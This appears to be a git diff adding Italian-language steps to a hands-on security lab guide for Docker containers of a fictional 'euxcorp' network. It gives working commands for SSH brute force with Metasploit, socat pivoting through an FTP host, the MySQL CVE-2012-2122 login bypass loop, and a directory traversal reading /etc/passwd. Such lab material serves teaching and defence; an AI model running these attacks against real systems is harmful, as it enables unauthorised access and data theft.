@@ -122,4 +122,127 @@ Il container `public.euxcorp.com` contiene un honeypot SSH configurato per regis
 
 ---
 
-Continua nella risposta successiva...
+5. Brute Force SSH sul container access.euxcorp.com (utilizzando il container attacker-private)
+Descrizione:
+Il container access.euxcorp.com offre un servizio SSH con credenziali deboli configurate intenzionalmente per dimostrare tecniche di brute force. Dal momento che questo servizio si trova sulla rete privata, l'attacco deve essere eseguito dal container attacker-private.
+
+Il brute force SSH è un metodo per ottenere accesso non autorizzato tentando diverse combinazioni di credenziali. Questo attacco è comune contro sistemi mal configurati o con password deboli.
+
+Passaggi:
+
+Accedi al container attacker-private:
+
+bash
+Copia
+Modifica
+docker exec -it attacker-private /bin/bash
+Avvia Metasploit:
+
+bash
+Copia
+Modifica
+./msfconsole -r docker/msfconsole.rc -y config/database.yml
+Carica il modulo per il brute force SSH:
+
+bash
+Copia
+Modifica
+use auxiliary/scanner/ssh/ssh_login
+Configura i parametri:
+
+bash
+Copia
+Modifica
+set RHOSTS 10.1.0.13
+set USER_FILE /path/to/usernames.txt
+set PASS_FILE /path/to/passwords.txt
+set STOP_ON_SUCCESS true
+run
+Verifica se il brute force ha avuto successo: Metasploit mostrerà la combinazione di credenziali corretta.
+
+6. Pivoting tramite FTP per accedere al container web.euxcorp.com
+Descrizione:
+Il pivoting è una tecnica avanzata per attraversare segmenti di rete separati dopo aver compromesso un sistema iniziale. Il container ftp.euxcorp.com, connesso sia alla rete pubblica che privata, funge da ponte (pivot) tra i due segmenti. Utilizzando socat, possiamo creare un tunnel TCP che reindirizza il traffico dalla rete pubblica verso il container web, che risiede solo sulla rete privata.
+
+Questa tecnica dimostra l'uso di un sistema compromesso per ottenere l'accesso ad altre aree della rete.
+
+Passaggi:
+
+Accedi al container FTP:
+
+bash
+Copia
+Modifica
+docker exec -it ftp.euxcorp.com /bin/bash
+Installa socat:
+
+bash
+Copia
+Modifica
+apk update && apk add socat
+Crea il tunnel TCP per il servizio web:
+
+bash
+Copia
+Modifica
+socat TCP-LISTEN:8081,reuseaddr,fork TCP:10.1.0.17:8080
+TCP-LISTEN:8081: Ascolta sulla porta 8081.
+
+TCP:10.1.0.17:8080: Instrada il traffico verso il servizio web sulla porta 8080.
+
+Dal container attacker, verifica il funzionamento del tunnel:
+
+bash
+Copia
+Modifica
+curl http://172.16.10.30:8081
+Se il tunnel è attivo, visualizzerai la risposta del servizio web.
+
+7. Attacco MySQL sul container mysql.euxcorp.com
+Descrizione:
+Il container MySQL utilizza la versione 5.5.23, vulnerabile a un exploit (CVE-2012-2122) che consente l’accesso non autorizzato quando viene inserita una password errata. Questo bug si verifica a causa di un errore nel controllo delle credenziali, in cui una password non corretta può essere casualmente accettata se una funzione hash restituisce uno zero.
+
+L'attacco consiste nel tentare più volte il login con una password sbagliata fino a quando l'errore si verifica, consentendo l'accesso come utente root.
+
+Passaggi:
+
+Dal container attacker, esegui il comando:
+
+bash
+Copia
+Modifica
+for i in `seq 1 1000`; do mysql -uroot -pwrong -h 172.16.10.60 -P3306 --skip-ssl; done
+for i in seq 1 1000: Esegue il comando 1000 volte.
+
+mysql -uroot -pwrong: Tenta di accedere come root con una password errata.
+
+--skip-ssl: Evita il controllo SSL.
+
+Verifica se uno dei tentativi riesce e accedi alla shell MySQL.
+
+Motivo: La vulnerabilità è causata da una gestione errata dell'autenticazione MySQL, in cui una password sbagliata può occasionalmente risultare accettata.
+
+8. Directory Traversal sul container web.euxcorp.com
+Descrizione:
+Il servizio web esposto dal container web.euxcorp.com è vulnerabile a una directory traversal (CVE-2018-7490). Questa vulnerabilità consente di accedere a file al di fuori della directory root tramite una richiesta HTTP manipolata. Il problema deriva da un'errata gestione dei caratteri di escape nei percorsi.
+
+Passaggi:
+
+Dal container attacker, utilizza il comando:
+
+bash
+Copia
+Modifica
+curl -v "http://127.0.0.1:8080/..%2f..%2f..%2f..%2fetc%2fpasswd"
+-v: Modalità verbosa per visualizzare la risposta completa.
+
+%2f: Rappresenta lo slash (/) nel percorso URL encoded.
+
+Se l'attacco ha successo, verrà visualizzato il contenuto del file /etc/passwd.
+
+Motivo: L’attacco sfrutta un bug nel parsing dei percorsi che non valida correttamente i caratteri %2f, consentendo di uscire dalla root directory e accedere a file sensibili.
+
+Conclusioni
+Questa guida fornisce un manuale completo e dettagliato per eseguire attacchi utilizzando Metasploit e Nmap, spiegando i motivi tecnici dietro ogni vulnerabilità sfruttata. Utilizzando comandi nativi e tecniche di pivoting, è possibile simulare scenari di attacco realistici.
+
+Ogni attacco dimostra come errori di configurazione o vulnerabilità software possano portare a compromissioni significative. L’obiettivo di questo laboratorio è offrire un’esperienza pratica per comprendere meglio le tecniche utilizzate dagli attaccanti e sviluppare strategie di difesa più efficaci.
